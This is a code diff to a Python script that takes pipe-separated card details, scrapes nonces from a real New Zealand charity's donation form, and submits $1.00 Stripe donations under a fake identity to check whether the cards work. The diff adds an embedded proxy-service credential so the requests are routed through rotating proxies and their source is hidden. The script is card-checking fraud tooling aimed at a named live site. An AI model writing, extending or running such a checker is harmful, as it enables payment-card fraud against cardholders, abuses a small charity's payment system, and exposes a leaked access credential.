@@ -1,6 +1,10 @@
 import requests,re
 import random
+from proxy import reqproxy, make_request
 def Tele(ccx):
+	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-kira:at8fz3ay0eaz"
+	session, ip = reqproxy(proxy_str)
+	#print(f"IP Address: {ip}")
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -30,7 +34,7 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
 	}
 	
-	response = requests.get('https://kahukura.co.nz/campaigns/donate/donate/', headers=headers)
+	response = session.get('https://kahukura.co.nz/campaigns/donate/donate/', headers=headers)
 	
 	form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
 	donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
@@ -76,7 +80,7 @@ def Tele(ccx):
 	
 	data = f'charitable_form_id={form_id}&{form_id}=&_charitable_donation_nonce={donation_nonce}&_wp_http_referer=%2Fcampaigns%2Fdonate%2Fdonate%2F&campaign_id=755&description=Become+a+financial+supporter!&ID=0&gateway=stripe&donation_amount=custom&custom_donation_amount=1.00&first_name=Rodam&last_name=User&email=rodamuser08%40gmail.com&address=&address_2=&city=&state=&postcode=&country=NZ&phone=&stripe_payment_method={pm}&action=make_donation&form_action=make_donation'
 	
-	response = requests.post('https://kahukura.co.nz/wp-admin/admin-ajax.php', headers=headers, data=data)
+	response = session.post('https://kahukura.co.nz/wp-admin/admin-ajax.php', headers=headers, data=data)
 	
 	try:
 		scrt = response.json().get('secret')
